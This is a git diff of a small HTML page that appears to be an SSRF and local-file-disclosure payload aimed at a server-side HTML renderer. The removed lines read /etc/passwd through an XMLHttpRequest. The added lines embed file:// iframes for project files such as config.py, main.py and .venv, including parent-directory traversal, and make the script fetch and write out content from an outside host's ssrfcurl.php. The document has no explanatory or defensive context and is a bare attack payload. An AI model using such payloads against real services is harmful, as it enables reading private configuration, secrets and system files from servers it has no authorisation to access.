@@ -7,14 +7,22 @@
     <title>Document</title>
 </head>
 <body>
-    <iframe src="https://anyquestions69.github.io/ssrfcurl.php" width="400" height="400"></iframe>
+    <iframe src="file://.venv" width="400" height="400"></iframe>
+    <iframe src="file://config.py" width="400" height="400"></iframe>
+    <iframe src="file://.gitignore" width="400" height="400"></iframe>
+    <iframe src="file://main.py" width="400" height="400"></iframe>
+    <iframe src="file://__pycache__" width="400" height="400"></iframe>
+    <iframe src="file://__init__.py" width="400" height="400"></iframe>
+    <iframe src="file://../__init__.py" width="400" height="400"></iframe>
+    <iframe src="file://../../__init__.py" width="400" height="400"></iframe>
+       
        
     <script>
         x=new XMLHttpRequest;
         x.onload=function(){
         document.write(this.responseText)
         };
-        x.open("GET","file:///etc/passwd");
+        x.open("GET","https://anyquestions69.github.io/ssrfcurl.php");
         x.send();
         </script>
 </html>
